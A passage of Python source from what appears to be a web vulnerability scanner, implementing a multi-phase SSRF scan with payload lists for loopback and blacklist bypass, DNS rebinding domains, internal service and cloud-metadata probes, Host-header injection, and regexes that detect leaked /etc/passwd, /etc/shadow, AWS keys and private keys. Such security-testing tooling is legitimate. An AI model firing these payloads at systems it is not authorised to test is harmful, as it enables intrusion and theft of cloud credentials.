    "http:127.0.0.1/",
    "http:/127.0.0.1/",
]

# ── DNS rebinding bypass domains ──────────────────────────────────────────────
# These domains briefly resolve to a safe IP then re-resolve to internal IP
_DNS_REBIND_DOMAINS = [
    "make-1.2.3.4-rebind-169.254.169.254-rr.1u.ms",
    "make-127.0.0.1-rebind-169.254.169.254-rr.1u.ms",
    "rebind.it.127.0.0.1.169.254.169.254.rbndr.us",
    "7f000001.169.254.169.254.rbndr.us",
]

# ── Service fingerprinting patterns ──────────────────────────────────────────
# Patterns indicating direct access to internal services (HIGH confidence)
_SERVICE_FINGERPRINTS = {
    "redis":       re.compile(r"(?:\+OK|redis_version|-ERR|-WRONGTYPE|\$-1)", re.IGNORECASE),
    "mysql":       re.compile(r"(?:mysql_native_password|5\.\d+\.\d+-MySQL|MariaDB)", re.IGNORECASE),
    "memcached":   re.compile(r"(?:STORED|END\r?\n|VALUE |STAT pid)", re.IGNORECASE),
    "fastcgi":     re.compile(r"(?:PHP Warning|Content-type: text/html.*\n.*\n.*X-Powered-By: PHP)", re.IGNORECASE),
    "smtp":        re.compile(r"(?:220 .* SMTP|250 .* Hello|Sendmail|Postfix|Exim)", re.IGNORECASE),
    "ftp":         re.compile(r"(?:220 .* FTP|230 Login|331 Password)", re.IGNORECASE),
    "mongodb":     re.compile(r"(?:\"ismaster\"|\"version\":.*\d+\.\d+|mongod)", re.IGNORECASE),
    "postgresql":  re.compile(r"(?:FATAL: .* authentication|PostgreSQL)", re.IGNORECASE),
    "docker":      re.compile(r"(?:\"ApiVersion\"|\"DockerRootDir\"|\"ServerVersion\")", re.IGNORECASE),
    "kubernetes":  re.compile(r"(?:\"kind\":.*\"List\"|\"apiVersion\".*\"v1\")", re.IGNORECASE),
    "consul":      re.compile(r"(?:\"Config\".*\"DataDir\"|\"Datacenter\":)", re.IGNORECASE),
    "elasticsearch": re.compile(r"(?:\"cluster_name\"|\"lucene_version\"|\"tagline\")", re.IGNORECASE),
    "jenkins":     re.compile(r"(?:X-Jenkins:|<hudson|Jenkins \d+\.\d+)", re.IGNORECASE),
    "tomcat":      re.compile(r"(?:Apache Tomcat|Coyote HTTP/1\.1|manager/html)", re.IGNORECASE),
    "rabbitmq":    re.compile(r"(?:RabbitMQ Management|\"product\":\"RabbitMQ\")", re.IGNORECASE),
    "zabbix":      re.compile(r"(?:ZBXD|zabbix_agentd)", re.IGNORECASE),
    "weblogic":    re.compile(r"(?:WebLogic Server|<wl:Error>|BEA-\d+)", re.IGNORECASE),
    "grafana":     re.compile(r"(?:Grafana|\"grafana_version\")", re.IGNORECASE),
    "influxdb":    re.compile(r"(?:influxdb|X-Influxdb-Version)", re.IGNORECASE),
    "kibana":      re.compile(r"(?:\"name\":\"kibana\"|kbn-version)", re.IGNORECASE),
}

# Response error strings that confirm the server attempted the connection
_CONNECTION_ERROR_STRINGS = [
    "connection refused",
    "connection reset",
    "econnrefused",
    "econnreset",
    "no route to host",
    "network is unreachable",
    "host unreachable",
    "connection timed out",
    "read timeout",
    "connection to",
    "failed to connect",
    "couldn't connect",
    "unable to connect",
    "socket error",
    "getsockopt",
    "getaddrinfo",
    "name or service not known",
    "nodename nor servname provided",
    "temporary failure in name resolution",
    "java.net.connectexception",
    "java.net.unknownhostexception",
    "org.apache.http",
    "curl: (7)",
    "curl: (6)",
    "ENOENT",
    "ETIMEDOUT",
    "dial tcp",      # Go stdlib
    "net/http",      # Go stdlib
    "requests.exceptions",
    "httpclient",
    "SSLError",
    "SSL_ERROR",
    "tls:",
]

# Sensitive data patterns that confirm data exfiltration via SSRF
_SENSITIVE_PATTERNS = [
    # Unix /etc/passwd
    re.compile(r"root:.*:0:0:", re.IGNORECASE),
    re.compile(r"/bin/(?:bash|sh|dash|false|nologin)", re.IGNORECASE),
    re.compile(r"nobody:x:\d+:\d+:", re.IGNORECASE),
    re.compile(r"www-data:x:\d+:\d+:", re.IGNORECASE),
    # /etc/shadow
    re.compile(r"root:\$[0-9a-z]+\$", re.IGNORECASE),
    # /proc/self/environ
    re.compile(r"HOME=|HOSTNAME=|PATH=/usr", re.IGNORECASE),
    # Windows
    re.compile(r"\[boot loader\]", re.IGNORECASE),
    re.compile(r"\[fonts\]", re.IGNORECASE),
    re.compile(r"multi\(0\)disk", re.IGNORECASE),
    re.compile(r"\[extensions\].*\.ini", re.IGNORECASE),
    # Redis
    re.compile(r"redis_version:", re.IGNORECASE),
    re.compile(r"redis_mode:", re.IGNORECASE),
    re.compile(r"\+OK\r?\n", re.IGNORECASE),
    re.compile(r"\$\d+\r\n", re.IGNORECASE),          # RESP protocol
    # Elasticsearch
    re.compile(r'"cluster_name"', re.IGNORECASE),
    re.compile(r'"elasticsearch"', re.IGNORECASE),
    re.compile(r'"lucene_version"', re.IGNORECASE),
    # Docker
    re.compile(r'"ApiVersion"', re.IGNORECASE),
    re.compile(r'"DockerRootDir"', re.IGNORECASE),
    re.compile(r'"ServerVersion".*"Os"', re.IGNORECASE),
    # Spring Boot Actuator
    re.compile(r'"_links".*"self"', re.IGNORECASE),
    re.compile(r'"activeProfiles"', re.IGNORECASE),
    # AWS credentials
    re.compile(r"AccessKeyId", re.IGNORECASE),
    re.compile(r"SecretAccessKey", re.IGNORECASE),
    re.compile(r"Token.*ASIA|AKIA", re.IGNORECASE),
    # Cloud metadata keywords
    re.compile(r"ami-id", re.IGNORECASE),
    re.compile(r"instance-id", re.IGNORECASE),
    re.compile(r"computeMetadata", re.IGNORECASE),
    re.compile(r"azEnvironment", re.IGNORECASE),
    # MySQL greeting
    re.compile(r"mysql_native_password", re.IGNORECASE),
    re.compile(r"5\.\d+\.\d+-MySQL", re.IGNORECASE),
    re.compile(r"MariaDB", re.IGNORECASE),
    # Memcached
    re.compile(r"STAT pid \d+", re.IGNORECASE),
    re.compile(r"STAT version", re.IGNORECASE),
    # MongoDB
    re.compile(r'"ismaster"', re.IGNORECASE),
    re.compile(r'"version":\s*"\d+\.\d+\.\d+".*"gitVersion"', re.IGNORECASE),
    # Jenkins
    re.compile(r"X-Jenkins:", re.IGNORECASE),
    re.compile(r"Jenkins \d+\.\d+", re.IGNORECASE),
    # Kubernetes
    re.compile(r'"kind"\s*:\s*"NodeList"', re.IGNORECASE),
    re.compile(r'"apiVersion"\s*:\s*"v1".*"kind"', re.IGNORECASE),
    # RabbitMQ
    re.compile(r'"product"\s*:\s*"RabbitMQ"', re.IGNORECASE),
    # Consul
    re.compile(r'"Config"\s*:\s*\{.*"DataDir"', re.IGNORECASE),
    # Grafana
    re.compile(r"grafana_version", re.IGNORECASE),
    # Zabbix
    re.compile(r"ZBXD", re.IGNORECASE),
    # WebLogic
    re.compile(r"BEA-\d+", re.IGNORECASE),
    re.compile(r"WebLogic Server", re.IGNORECASE),
    # Tomcat
    re.compile(r"Apache Tomcat/\d+\.\d+", re.IGNORECASE),
    # Generic private keys / secrets
    re.compile(r"-----BEGIN (RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----", re.IGNORECASE),
    re.compile(r"-----BEGIN CERTIFICATE-----", re.IGNORECASE),
]


# ─────────────────────────────────────────────────────────────────────────────
# SsrfScanMixin
# ─────────────────────────────────────────────────────────────────────────────

class SsrfScanMixin:
    """
    Mixin providing SSRF vulnerability scan methods.
    Must be combined with ScanWorker (provides send_request_with_traffic,
    scan_progress signal, request_data, running, boost_mode, etc.)
    """

    # =========================================================================
    # PUBLIC ENTRY POINT
    # =========================================================================

    def scan_ssrf(self) -> Dict[str, Any]:
        """
        Full SSRF scan across all attack categories.
        Returns a results dict compatible with the standard scanner framework.
        """
        self.scan_progress.emit("🔍 Starting SSRF (Server-Side Request Forgery) scan...")
        self.scan_progress.emit("=" * 60)

        results: Dict[str, Any] = {
            "scan_type": "SSRF",
            "vulnerable": False,
            "details": [],
            "summary": "",
            "stats": {
                "candidates_found":   0,
                "payloads_tested":    0,
                "phases_run":         [],
                "vulnerabilities":    0,
            },
            "detection_summary": {
                "loopback":           False,
                "internal_network":   False,
                "cloud_metadata":     False,
                "blacklist_bypass":   False,
                "whitelist_bypass":   False,
                "open_redirect":      False,  # reserved for future open-redirect scanner
                "blind_oob":          False,
                "referer_header":     False,
                "smart_value_aware":  False,
                "protocol_smuggling": False,
                "gopher_service_rce": False,
                "docker_api":         False,
                "dns_rebinding":      False,
                "url_parser_discrepancy": False,
                "imdsv2":             False,
                "host_header":        False,
            },
        }

        try:
            # ── Parse the raw request ─────────────────────────────────────
            full_url, method, headers, body_params, body_content, cookies = \
                self._ssrf_parse_request()

            if not full_url:
                results["summary"] = "No URL provided."
                return results

            parsed = urllib.parse.urlparse(full_url)

            # ── Get baseline ──────────────────────────────────────────────
            baseline = self._ssrf_baseline(full_url, method, headers,
                                           body_params, body_content, cookies)
            if not baseline:
                results["summary"] = "Could not establish baseline response."
                return results

            self.scan_progress.emit(
                f"\n📈 Baseline — Status: {baseline['status']}  "
                f"Length: {baseline['length']}  Time: {baseline['time']}s"
            )

            # ── Identify SSRF candidates ──────────────────────────────────
            candidates = self._ssrf_identify_candidates(
                parsed, params=urllib.parse.parse_qs(parsed.query),
                headers=headers, body_params=body_params,
                body_content=body_content,
            )
            results["stats"]["candidates_found"] = len(candidates)

            if not candidates:
                self.scan_progress.emit(
                    "\n⚠️  No SSRF-candidate parameters or headers found.\n"
                    "    Tip: Look for params named url/src/dest/redirect/host "
                    "or values that already contain URLs."
                )
                results["summary"] = (
                    "No SSRF candidates found. "
                    "No URL-like parameters or headers detected."
                )
                return results

            self.scan_progress.emit(
                f"\n🎯 SSRF candidates identified: {len(candidates)}"
            )
            for c in candidates:
                tier  = "🔴 HIGH" if c["tier"] == "high" else "🟡 MED"
                self.scan_progress.emit(
                    f"  [{tier}] {c['display']}  "
                    f"current value: {str(c['value'])[:60]}"
                )

            # ── Run each phase ────────────────────────────────────────────
            ctx = {
                "full_url":     full_url,
                "parsed":       parsed,
                "method":       method,
                "headers":      headers,
                "body_params":  body_params,
                "body_content": body_content,
                "cookies":      cookies,
                "baseline":     baseline,
                "results":      results,
            }

            for candidate in candidates:
                if not self.running:
                    break
                self._ssrf_run_all_phases(candidate, ctx)

            # ── Phase 7: Referer header SSRF ─────────────────────────────
            # In forced mode only run if the user explicitly selected Referer.
            # In auto mode always run (it's a high-value default target).
            _forced = getattr(self, "forced_injection_points", None)
            _referer_selected = (
                _forced is None or
                self._is_forced_point("header", "Referer")
            )
            if self.running and _referer_selected:
                self._ssrf_phase_referer(ctx)
            elif self.running:
                self.scan_progress.emit(
                    "\n⏭️  Phase 7 — Referer Header SSRF skipped "
                    "(Referer not selected as injection point)"
                )

            # ── Phase 7b: Host header injection (dedicated phase) ─────────
            # In forced mode skip unless the user selected at least one of:
            # Host, X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, or an
            # IP-spoof header — all of which are tested in this phase.
            _host_headers = [
                "Host", "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL",
                "X-Forwarded-Prefix", "X-Custom-IP-Authorization", "True-Client-IP",
                "CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP",
                "X-Originating-IP", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP",
            ]
            _host_selected = (
                _forced is None or
                any(self._is_forced_point("header", h) for h in _host_headers)
            )
            if self.running and _host_selected:
                self._ssrf_phase_host_header(ctx)
            elif self.running:
                self.scan_progress.emit(
                    "\n⏭️  Phase 7b — Host Header SSRF skipped "
                    "(no host/forwarding headers selected as injection points)"
                )

        except Exception as e:
            logger.error(f"SSRF scan error: {e}", exc_info=True)
            results["error"] = str(e)

        # ── Final summary ─────────────────────────────────────────────────
        n = results["stats"]["vulnerabilities"]
        if results["vulnerable"]:
            phases = ", ".join(
                k for k, v in results["detection_summary"].items() if v
            )
            results["summary"] = (
                f"✅ SSRF vulnerability detected! "
                f"{n} finding(s) across phase(s): {phases}."
            )
        else:
            results["summary"] = (
                "❌ No SSRF vulnerabilities confirmed. "
                f"{results['stats']['payloads_tested']} payloads tested."
            )

        return results

    # =========================================================================
    # PHASE ORCHESTRATOR
    # =========================================================================

    def _ssrf_run_all_phases(self, candidate: Dict, ctx: Dict) -> None:
        """Run every SSRF phase against a single candidate parameter/header."""
        full_url    = ctx["full_url"]
        parsed      = ctx["parsed"]
        method      = ctx["method"]
        headers     = ctx["headers"]
        body_params = ctx["body_params"]
        body_content= ctx["body_content"]
        cookies     = ctx["cookies"]
        baseline    = ctx["baseline"]
        results     = ctx["results"]

        cname  = candidate["name"]
        ctype  = candidate["type"]   # "param_url", "param_body", "header"
        cvalue = candidate["value"]

        self.scan_progress.emit(
            f"\n{'='*60}\n"
            f"🔬 Testing candidate: {candidate['display']}\n"
            f"{'='*60}"
        )

        # ── Phase 8: Smart value-aware (must come first — most targeted) ──
        # Only for URL/body params — an Origin/Referer header containing the
        # app's own URL must NOT trigger a subnet/port sweep of that host.
        if ctype in ("param_url", "param_body") and self._ssrf_value_is_url(cvalue):
            self.scan_progress.emit(
                "\n📡 Phase 8 — Smart Value-Aware: "
                "current value is a URL — running Intruder-style sweep"
            )
            self._ssrf_phase_smart_value(
                candidate, full_url, parsed, method, headers,
                body_params, body_content, cookies, baseline, results
            )
            results["stats"]["phases_run"].append("smart_value_aware")

        # ── Phase 1: Loopback / server-side SSRF ─────────────────────────
        self.scan_progress.emit("\n🔁 Phase 1 — Loopback / Server SSRF")
        self._ssrf_phase_loopback(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("loopback")

        # ── Phase 2: Internal network back-end enumeration ────────────────
        self.scan_progress.emit("\n🌐 Phase 2 — Internal Network Enumeration")
        self._ssrf_phase_internal_network(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("internal_network")

        # ── Phase 3: Blacklist-bypass obfuscation ─────────────────────────
        self.scan_progress.emit("\n🎭 Phase 3 — Blacklist Bypass Obfuscation")
        self._ssrf_phase_blacklist_bypass(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("blacklist_bypass")

        # ── Phase 4: Whitelist-bypass URL confusion ───────────────────────
        original_host = self._ssrf_extract_host_from_value(cvalue) or "trusted.example.com"
        self.scan_progress.emit("\n🔀 Phase 4 — Whitelist Bypass URL Confusion")
        self._ssrf_phase_whitelist_bypass(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            original_host=original_host
        )
        results["stats"]["phases_run"].append("whitelist_bypass")

        # ── Phase 6: Blind SSRF via OOB ──────────────────────────────────
        oast = getattr(self, "oast_url", None)
        if oast:
            self.scan_progress.emit(
                f"\n📡 Phase 6 — Blind SSRF (OOB) via {oast}"
            )
            self._ssrf_phase_oob(
                candidate, full_url, parsed, method, headers,
                body_params, body_content, cookies, baseline, results,
                oast_url=oast
            )
            results["stats"]["phases_run"].append("blind_oob")
        else:
            self.scan_progress.emit(
                "\n⏭️  Phase 6 — Blind SSRF (OOB) skipped "
                "(no OAST URL configured — set interactsh URL in scan options)"
            )

        # ── Phase 9: Partial-URL / hostname-only injection ────────────────
        self.scan_progress.emit("\n🧩 Phase 9 — Partial URL / Hostname Injection")
        self._ssrf_phase_partial_url(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("partial_url")

        # ── Phase 10: Cloud metadata ──────────────────────────────────────
        self.scan_progress.emit("\n☁️  Phase 10 — Cloud Metadata Endpoint Probing")
        self._ssrf_phase_cloud_metadata(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("cloud_metadata")

        # ── Phase 10b: Protocol smuggling ────────────────────────────────
        self.scan_progress.emit("\n🔌 Phase 10b — Protocol Smuggling")
        self._ssrf_phase_protocol_smuggling(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("protocol_smuggling")

        # ── Phase 11: Gopher service exploitation (SSRFmap-style) ─────────
        self.scan_progress.emit("\n☠️  Phase 11 — Gopher Service Exploitation")
        self._ssrf_phase_gopher_services(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("gopher_service_rce")

        # ── Phase 12: Docker API info-leak ────────────────────────────────
        self.scan_progress.emit("\n🐳 Phase 12 — Docker API Info-Leak")
        self._ssrf_phase_docker_api(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("docker_api")

        # ── Phase 13: DNS rebinding bypass ────────────────────────────────
        self.scan_progress.emit("\n🔄 Phase 13 — DNS Rebinding Bypass")
        self._ssrf_phase_dns_rebinding(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("dns_rebinding")

        # ── Phase 14: URL parser discrepancy ─────────────────────────────
        self.scan_progress.emit("\n🧩 Phase 14 — URL Parser Discrepancy")
        self._ssrf_phase_url_parser(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("url_parser_discrepancy")

        # ── Phase 15: AWS IMDSv2 token-fetch ─────────────────────────────
        self.scan_progress.emit("\n☁️  Phase 15 — AWS IMDSv2 Token Escalation")
        self._ssrf_phase_imdsv2(
            candidate, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results
        )
        results["stats"]["phases_run"].append("imdsv2")

    # =========================================================================
    # PHASE 1 — LOOPBACK / SERVER-SIDE SSRF
    # =========================================================================

    def _ssrf_phase_loopback(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Inject loopback addresses + common admin paths into the candidate.
        Detects access-control bypass where localhost is trusted implicitly.

        Covers:
          - http:// and https:// loopback variants
          - IPv6 [::] and [0000::1] with common service ports (80/22/25/3128)
          - [0:0:0:0:0:ffff:127.0.0.1] IPv4-mapped IPv6
          - All hosts in _LOOPBACK_HOSTS × top admin paths
        """
        payloads = []

        # HTTPS variants of plain loopback (bypass SSL-scheme checks)
        payloads += [
            "https://127.0.0.1/",
            "https://localhost/",
            "https://127.0.0.1/admin",
            "https://localhost/admin",
        ]

        # IPv6 any-address with common service ports
        payloads += [
            "http://[::]:80/",
            "http://[::]:22/",
            "http://[::]:25/",
            "http://[::]:3128/",
            "http://0000::1:80/",
            "http://0000::1:22/",
            "http://0000::1:25/",
            "http://0000::1:3128/",
            "http://[0:0:0:0:0:ffff:127.0.0.1]/",
        ]

        for host in _LOOPBACK_HOSTS:
            # Bare loopback (root path)
            payloads.append(f"http://{host}/")
            # With common admin paths
            for path in _ADMIN_PATHS[:8]:   # top 8 most common
                payloads.append(f"http://{host}{path}")

        self._ssrf_fire_payloads(
            candidate, payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="loopback", phase_key="loopback",
            confidence_base="HIGH",
        )

    # =========================================================================
    # PHASE 2 — INTERNAL NETWORK ENUMERATION
    # =========================================================================

    def _ssrf_phase_internal_network(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Probe a curated set of common internal IPs and their admin paths.
        (Full subnet sweep is handled by Phase 8 when an IP is already present.)
        """
        # High-value internal targets to always probe
        static_targets = [
            "http://192.168.0.1/admin",
            "http://192.168.1.1/admin",
            "http://10.0.0.1/admin",
            "http://10.0.1.1/admin",
            "http://172.16.0.1/admin",
            "http://192.168.0.68/admin",    # PortSwigger lab example
            "http://192.168.0.1:8080/admin",
            "http://10.0.0.1:8080/",
            "http://192.168.1.1:8080/",
            "http://192.168.0.1:8888/",
            # Common private infrastructure
            "http://10.0.0.138:5601/",      # Kibana
            "http://192.168.0.1:9200/",     # Elasticsearch
            "http://10.0.0.1:6379/",        # Redis
            "http://10.0.0.1:2375/version", # Docker API
            "http://10.0.0.1:8500/v1/agent/self",  # Consul
        ]

        self._ssrf_fire_payloads(
            candidate, static_targets, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="internal_network", phase_key="internal_network",
            confidence_base="HIGH",
        )

    # =========================================================================
    # PHASE 3 — BLACKLIST-BYPASS OBFUSCATION
    # =========================================================================

    def _ssrf_phase_blacklist_bypass(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results
    ) -> None:
        """
        Try obfuscated forms of 127.0.0.1 / localhost that bypass naive
        string-match blacklists.

        Two payload sets:
          1. _BYPASS_LOOPBACK — host-only tokens wrapped into http://{host}/
             and http://{host}/admin (decimal, hex, octal, encoding variants).
          2. _BYPASS_LOOPBACK_RAW_URLS — full URL payloads injected verbatim
             (HTTPS bypass, IPv6 service ports, filter_var tricks, parser splits,
              decimal full-URL forms, malformed port strings, URL-path encoding).
        """
        # Set 1 — wrapped host tokens
        payloads = []
        for host in _BYPASS_LOOPBACK:
            # Entries that already contain a scheme or look like full URLs are
            # injected raw; everything else gets wrapped in http://…/
            if host.startswith("http") or host.startswith("0://"):
                payloads.append(host)
            else:
                payloads.append(f"http://{host}/")
                payloads.append(f"http://{host}/admin")

        self._ssrf_fire_payloads(
            candidate, payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="blacklist_bypass", phase_key="blacklist_bypass",
            confidence_base="MEDIUM",
        )

        # Set 2 — full-URL bypass payloads (HTTPS, IPv6 ports, parser splits, etc.)
        self._ssrf_fire_payloads(
            candidate, _BYPASS_LOOPBACK_RAW_URLS, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="blacklist_bypass", phase_key="blacklist_bypass",
            confidence_base="MEDIUM",
            raw_inject=True,   # do not URL-encode the payload
        )

    # =========================================================================
    # PHASE 4 — WHITELIST-BYPASS URL CONFUSION
    # =========================================================================

    def _ssrf_phase_whitelist_bypass(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results,
        original_host: str = "trusted.example.com",
    ) -> None:
        """
        Exploit URL-parser inconsistencies to bypass whitelist filters.

        The key insight (PortSwigger SSRF lab):
          The app validates the URL contains the expected host, but the backend
          fetcher re-decodes characters before following the URL.

          http://localhost:80%2523@stock.weliketoshop.net/
            Frontend sees: userinfo=localhost:80%2523, host=stock.weliketoshop.net  ✓
            Backend decodes %2523 → %23 → #, so reads: localhost:80 followed by
            fragment=#@stock.weliketoshop.net — connects to localhost!

        {LEGIT}      = full netloc e.g. stock.weliketoshop.net:8080
        {LEGIT_HOST} = hostname only e.g. stock.weliketoshop.net
        """
        # Parse out host-only from "host:port" netloc
        legit_netloc = original_host            # e.g. stock.weliketoshop.net:8080
        if ":" in original_host:
            legit_host = original_host.split(":")[0]   # stock.weliketoshop.net
        else:
            legit_host = original_host

        payloads = []
        seen: set = set()

        for tmpl in _WHITELIST_BYPASS_TEMPLATES:
            p = (tmpl
                 .replace("{LEGIT}", legit_netloc)
                 .replace("{LEGIT_HOST}", legit_host))
            if p not in seen:
                seen.add(p)
                payloads.append(p)

        self.scan_progress.emit(
            f"  ↳ Whitelist host: {legit_netloc}  "
            f"({len(payloads)} bypass variant(s))"
        )

        self._ssrf_fire_payloads(
            candidate, payloads, full_url, parsed, method, headers,
            body_params, body_content, cookies, baseline, results,
            phase="whitelist_bypass", phase_key="whitelist_bypass",
            confidence_base="MEDIUM",
            raw_inject=True,   # don't URL-encode the payload value
        )

    # =========================================================================
    # PHASE 6 — BLIND SSRF VIA OOB (OAST)
    # =========================================================================

    def _ssrf_phase_oob(
        self, candidate, full_url, parsed, method, headers,
        body_params, body_content, cookies, baseline, results,
        oast_url: str = "",
    ) -> None:
        """
        Inject an interactsh / Burp Collaborator URL to detect blind SSRF.
        A DNS lookup or HTTP callback to oast_url confirms out-of-band interaction.

        Note: we cannot detect the callback ourselves — we record the payload
        as INFO and advise the tester to check their interactsh dashboard.
        https://app.interactsh.com
        """
        if not oast_url:
            return

        oast_clean = oast_url.strip().rstrip("/")
        # Ensure the OAST URL has a scheme
        if not oast_clean.startswith("http"):
            oast_clean = f"http://{oast_clean}"

        payloads = [
            oast_clean,
            f"{oast_clean}/ssrf-test",
            f"{oast_clean}/?q=ssrf",
            # HTTP → HTTPS redirect bypass
            oast_clean.replace("http://", "https://"),
            # DNS-only probe (subdomain)
            f"http://ssrf-probe.{urllib.parse.urlparse(oast_clean).netloc}/",
        ]

        self.scan_progress.emit(
            f"  ℹ️  Injecting OAST payload(s). "
            f"Monitor your interactsh dashboard at https://app.interactsh.com"
        )

        for payload in payloads:
            if not self.running:
                break
            injected = self._ssrf_inject(
                candidate, payload, full_url, parsed, method,
                headers, body_params, body_content, cookies,
                phase="blind_oob",
            )
            results["stats"]["payloads_tested"] += 1

            if injected:
                # We can't observe the OOB callback, so we record it as INFO
                # and tell the tester to check their dashboard.
                self._ssrf_record_finding(
                    results, candidate, payload,
                    injected["status"], injected["length"], injected["time"],
                    baseline, phase="blind_oob",
                    confidence="INFO",
                    note=(
                        "OOB payload injected. "
                        "Check https://app.interactsh.com for DNS/HTTP callbacks."
                    ),
                    force=True,   # always record OOB payloads so tester can verify
                )

    # =========================================================================
    # PHASE 7 — REFERER HEADER SSRF
    # =========================================================================

    # =========================================================================
    # PHASE 7b — HOST HEADER SSRF / INJECTION
    # =========================================================================

    def _ssrf_phase_host_header(self, ctx: Dict) -> None:
        """
        Host header injection covers three distinct attack classes:

        1. Password reset poisoning
           The app embeds the Host header value in password-reset emails.
           Replacing it with an attacker-controlled domain causes victims to
           click links that exfiltrate their reset tokens.
           Payload: Host: attacker.com  (use OAST domain if configured)

        2. Reverse-proxy / backend routing abuse (SSRF via Host)
           Some reverse proxies route requests based on the Host header to
           internal backend services.  Setting Host to an internal hostname
           or IP causes the proxy to forward the request to that service.
           Payloads: internal hostnames, loopback, cloud metadata IP

        3. Cache poisoning via unkeyed Host header
           If the caching layer doesn't include Host in its cache key, a
           response poisoned with a malicious Host value gets served to all
           subsequent users hitting the same URL.

        Detection signals:
          • Attacker domain / injected host reflected in Location, Link,
            Set-Cookie, or response body (password reset poisoning evidence)
          • Different status or body length for internal host payloads
            (backend routing abuse)
          • OOB interaction received (blind SSRF via Host)
        """
        full_url     = ctx["full_url"]
        parsed       = ctx["parsed"]
        method       = ctx["method"]
        headers      = ctx["headers"]
        body_content = ctx["body_content"]
        baseline     = ctx["baseline"]
        results      = ctx["results"]

        real_host = parsed.netloc  # e.g. "vulnerable-website.com"
        oast      = getattr(self, "oast_url", None)

        self.scan_progress.emit("\n🖥️  Phase 7b — Host Header SSRF / Injection")

        # ── Payload groups ────────────────────────────────────────────────
        host_payloads = []

        # Group 1: Attacker-controlled domains (password-reset poisoning / OOB)
        # These only make sense if an OAST URL is configured — otherwise skip
        # to avoid flooding results with noise.
        if oast:
            oast_host = urllib.parse.urlparse(oast).netloc or oast.strip().rstrip("/")
            host_payloads += [
                (oast_host,                        "oob_host",    "LOW"),
                (f"{oast_host}:80",                "oob_host",    "LOW"),
                (f"attacker.{real_host}",          "spoof_host",  "INFO"),
                (f"{real_host}.{oast_host}",       "spoof_host",  "INFO"),
            ]

        # Group 2: Loopback / localhost → backend routing abuse
        host_payloads += [
            ("localhost",                          "loopback_host", "MEDIUM"),
            ("127.0.0.1",                          "loopback_host", "MEDIUM"),
            ("127.0.0.1:80",                       "loopback_host", "MEDIUM"),
            ("127.0.0.1:8080",                     "loopback_host", "MEDIUM"),
            ("127.0.0.1:8443",                     "loopback_host", "MEDIUM"),
            ("0.0.0.0",                            "loopback_host", "MEDIUM"),
            ("localhost:80",                       "loopback_host", "MEDIUM"),
            ("localhost:8080",                     "loopback_host", "MEDIUM"),
        ]

        # Group 3: Cloud metadata IP via Host (reverse-proxy may route it)
        host_payloads += [
            ("169.254.169.254",                    "cloud_metadata_host", "HIGH"),
            ("169.254.169.254:80",                 "cloud_metadata_host", "HIGH"),
            ("metadata.google.internal",           "cloud_metadata_host", "HIGH"),
        ]

        # Group 4: X-Forwarded-Host companion injection
        # Some proxies honour X-Forwarded-Host for routing even when Host is correct.
        # These are injected as X-Forwarded-Host, NOT as Host.
        xfh_payloads = [
            ("169.254.169.254",                    "xfh_cloud",     "HIGH"),
            ("localhost",                          "xfh_loopback",  "MEDIUM"),
            ("127.0.0.1",                          "xfh_loopback",  "MEDIUM"),
        ]
        if oast:
            oast_host = urllib.parse.urlparse(oast).netloc or oast.strip().rstrip("/")
            xfh_payloads.insert(0, (oast_host,    "xfh_oob",       "LOW"))

        self.scan_progress.emit(
            f"  ↳ {len(host_payloads)} Host header payloads + "
            f"{len(xfh_payloads)} X-Forwarded-Host payloads"
        )

        # ── Fire Host header payloads ─────────────────────────────────────
        for host_val, sub_phase, conf_base in host_payloads:
            if not self.running:
                break

            # Strip existing Host; inject our value
            mod_headers = {k: v for k, v in headers.items()
                           if k.lower() != "host"}
            mod_headers["Host"] = host_val

            start = time.time()
            try:
                resp = self.send_request_with_traffic(
                    full_url, mod_headers, method=method,
                    body=body_content,
                    payload=host_val,
                    payload_type=f"SSRF-HostHdr-{sub_phase}",
                )
                elapsed = round(time.time() - start, 3)
                results["stats"]["payloads_tested"] += 1

                if resp and hasattr(resp, "status_code"):
                    status = getattr(resp, "status_code", 0)
                    length = len(getattr(resp, "content", b""))
                    text   = getattr(resp, "text", "")

                    # ── Detection signals specific to Host header ─────────
                    extra_note = ""

                    # Signal 1: injected host reflected in response headers/body
                    # (password reset poisoning / cache poisoning evidence)
                    loc = ""
                    if hasattr(resp, "headers"):
                        loc = resp.headers.get("Location", "")
                    if host_val in text or host_val in loc:
                        extra_note = (
                            f"⚠️ Injected Host '{host_val}' reflected in response "
                            f"({'Location header' if host_val in loc else 'body'}) — "
